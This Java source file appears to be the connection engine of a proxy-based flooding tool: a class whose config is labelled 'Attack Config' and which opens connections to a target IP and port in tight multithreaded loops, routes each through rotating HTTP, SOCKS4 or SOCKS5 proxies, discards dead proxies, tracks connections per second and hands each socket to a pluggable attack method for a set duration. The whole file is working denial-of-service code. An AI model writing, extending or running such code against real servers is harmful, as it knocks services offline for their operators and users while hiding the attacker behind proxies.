package dev.lastknell.core;

import dev.lastknell.core.methods.IMethod;
import dev.lastknell.core.proxy.Proxy;
import dev.lastknell.core.proxy.ProxyManager;
import dev.lastknell.core.proxy.util.ProxyType;
import io.netty.bootstrap.Bootstrap;
import io.netty.channel.*;
import io.netty.channel.epoll.EpollEventLoopGroup;
import io.netty.channel.epoll.EpollSocketChannel;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.proxy.HttpProxyHandler;
import io.netty.handler.proxy.Socks4ProxyHandler;
import io.netty.handler.proxy.Socks5ProxyHandler;
import io.netty.util.ResourceLeakDetector;
import org.jetbrains.annotations.NotNull;

import java.net.InetSocketAddress;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class NettyBootstrap {
    public static Class<? extends Channel> socketChannel;
    public final int protocolID;
    public final String srvIp;
    public final int port;

    private final ChannelHandler TAIL = new ChannelHandler() {
        @Override
        public void handlerAdded(ChannelHandlerContext ctx) {

        }

        @Override
        public void handlerRemoved(ChannelHandlerContext ctx) {

        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    };
    // Netty related
    private final EventLoopGroup eventLoopGroup;
    // BOOTSTRAP
    private final Bootstrap BOOTSTRAP;
    public volatile int triedCPS = 0;
    public volatile int openedCPS = 0;
    public volatile int successfulCPS = 0;
    public volatile int totalCPS = 0;
    public volatile int averageCPS = 0;
    public boolean shouldStop = false;
    public Builder builder;

    /**
     * @param builder Attack Config
     */
    public NettyBootstrap(Builder builder) {
        this.srvIp = builder.srvIp;
        this.port = builder.port;
        this.protocolID = builder.protocolID;
        this.builder = builder;

        if (builder.usingEpoll) {

            socketChannel = EpollSocketChannel.class;
            eventLoopGroup = new EpollEventLoopGroup(builder.workerThreads, r -> {
                Thread t = new Thread(r);
                t.setDaemon(true);
                t.setPriority(5);
                return t;
            });

        } else {
            socketChannel = NioSocketChannel.class;
            eventLoopGroup = new NioEventLoopGroup(builder.workerThreads, r -> {
                Thread t = new Thread(r);
                t.setDaemon(true);
                t.setPriority(10);
                return t;
            });
        }
        BOOTSTRAP = new Bootstrap().channel(socketChannel).group(eventLoopGroup).option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE);
        // ChannelInitializer with HTTP proxy
        ChannelInitializer<Channel> HTTP = new ChannelInitializer<>() {
            @Override
            public void channelInactive(@NotNull ChannelHandlerContext ctx) {
                ctx.channel().close();
            }

            @Override
            protected void initChannel(final @NotNull Channel c) {
                try {
                    final Proxy proxy = builder.proxyManager.getProxy();
                    final HttpProxyHandler s = (proxy.requiresAuthentication()) ? new HttpProxyHandler(proxy.getAddress(), proxy.getEmail(), proxy.getPassword()) : new HttpProxyHandler(proxy.getAddress());
                    s.setConnectTimeoutMillis(5000L);
                    s.connectFuture().addListener(f -> {
                        if (f.isSuccess() && s.isConnected()) {
                            triedCPS++;
                            builder.method.accept(c, proxy);
                        } else {
                            builder.proxyManager.removeProxy(proxy);
                            c.close();
                        }
                    });
                    c.pipeline().addFirst(s).addLast(TAIL);
                } catch (Exception e) {
                    c.close();
                }
            }

            @Override
            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
                ctx.close();
            }
        };
        // ChannelInitializer with SOCKS4 proxy
        ChannelInitializer<Channel> SOCKS4 = new ChannelInitializer<>() {
            @Override
            public void channelInactive(@NotNull ChannelHandlerContext ctx) {
                ctx.channel().close();
            }

            @Override
            protected void initChannel(final @NotNull Channel c) {
                try {
                    final Proxy proxy = builder.proxyManager.getProxy();
                    final Socks4ProxyHandler s = (proxy.requiresAuthentication()) ? new Socks4ProxyHandler(proxy.getAddress(), proxy.getEmail()) : new Socks4ProxyHandler(proxy.getAddress());
                    s.setConnectTimeoutMillis(5000L);
                    s.connectFuture().addListener(f -> {
                        if (f.isSuccess() && s.isConnected()) {
                            triedCPS++;
                            builder.method.accept(c, proxy);
                        } else {
                            builder.proxyManager.removeProxy(proxy);
                            c.close();
                        }
                    });
                    c.pipeline().addFirst(s).addLast(TAIL);
                } catch (Exception e) {
                    c.close();
                }
            }

            @Override
            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
                ctx.close();
            }
        };
        // ChannelInitializer with SOCKS5 proxy
        ChannelInitializer<Channel> SOCKS5 = new ChannelInitializer<>() {
            @Override
            public void channelInactive(ChannelHandlerContext ctx) {
                ctx.channel().close();
            }

            @Override
            protected void initChannel(final @NotNull Channel c) {
                try {
                    final Proxy proxy = builder.proxyManager.getProxy();
                    final Socks5ProxyHandler s = (proxy.requiresAuthentication()) ? new Socks5ProxyHandler(proxy.getAddress(), proxy.getEmail(), proxy.getPassword()) : new Socks5ProxyHandler(proxy.getAddress());
                    s.setConnectTimeoutMillis(5000L);
                    s.connectFuture().addListener(f -> {
                        if (f.isSuccess() && s.isConnected()) {
                            triedCPS++;
                            builder.method.accept(c, proxy);
                        } else {
                            builder.proxyManager.removeProxy(proxy);
                            c.close();
                        }
                    });
                    c.pipeline().addFirst(s).addLast(TAIL);
                } catch (Exception e) {
                    c.close();
                }
            }

            @Override
            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
                ctx.close();
            }
        };

        switch (builder.proxyType) {
            case SOCKS4 -> BOOTSTRAP.handler(SOCKS4);
            case SOCKS5 -> BOOTSTRAP.handler(SOCKS5);
            case HTTP -> BOOTSTRAP.handler(HTTP);
            default -> throw new IllegalStateException("Unexpected value: " + builder.proxyType);
        }
    }

    public void start() {
        ResourceLeakDetector.setLevel(ResourceLeakDetector.Level.SIMPLE);

        Thread Counter;
        Counter = new Thread(() -> {
            int elapsed = 0;
            while (!shouldStop) {
                elapsed++;
                if (elapsed > builder.duration) {
                    shouldStop = true;
                    NettyBootstrap.this.stop();
                    break;
                }
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException ignored) {
                }
                totalCPS += successfulCPS;
                openedCPS = 0;
                successfulCPS = 0;
                triedCPS = 0;
                averageCPS = totalCPS / elapsed;
            }
        });

        Counter.start();
        ExecutorService executor = Executors.newFixedThreadPool(builder.connectLoopThreads);
        for (int i = 0; i < builder.connectLoopThreads; i++) {
            executor.execute(connectLoopThread::new);
        }
        executor.shutdown();
    }

    public void stop() {
        shouldStop = true;
        eventLoopGroup.shutdownGracefully();
    }

    public static class Builder {
        // Required parameters
        private final IMethod method;
        private final String srvIp;
        private final int port;
        private int protocolID;
        private int duration;
        private int perDelay;
        private int delay;
        private int connectLoopThreads;
        private int workerThreads;
        private ProxyType proxyType;
        private boolean usingEpoll;
        private ProxyManager proxyManager;

        public Builder(IMethod method, String srvIp, int port) {
            this.method = method;
            this.srvIp = srvIp;
            this.port = port;
        }

        public Builder duration(int duration) {
            this.duration = duration;
            return this;
        }

        public Builder perDelay(int perDelay) {
            this.perDelay = perDelay;
            return this;
        }

        public Builder connectLoopThreads(int connectLoopThreads) {
            this.connectLoopThreads = connectLoopThreads;
            return this;
        }

        public Builder protocolID(int protocolID) {
            this.protocolID = protocolID;
            return this;
        }

        public Builder usingEpoll(boolean usingEpoll) {
            this.usingEpoll = usingEpoll;
            return this;
        }

        public Builder workerThreads(int workerThreads) {
            this.workerThreads = workerThreads;
            return this;
        }

        public Builder delay(int delay) {
            this.delay = delay;
            return this;
        }

        public Builder proxyType(ProxyType proxyType) {
            this.proxyType = proxyType;
            return this;
        }

        public Builder proxyManager(ProxyManager proxyManager) {
            this.proxyManager = proxyManager;
            return this;
        }

        public NettyBootstrap build() {
            return new NettyBootstrap(this);
        }
    }

    private class connectLoopThread implements Runnable {
        @Override
        public void run() {
            InetSocketAddress addr = new InetSocketAddress(builder.srvIp, builder.port);
            while (!shouldStop) {
                for (int j = 0; j < builder.perDelay; j++) {
                    BOOTSTRAP.connect(addr);
                }
                try {
                    Thread.sleep(builder.delay);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }
}
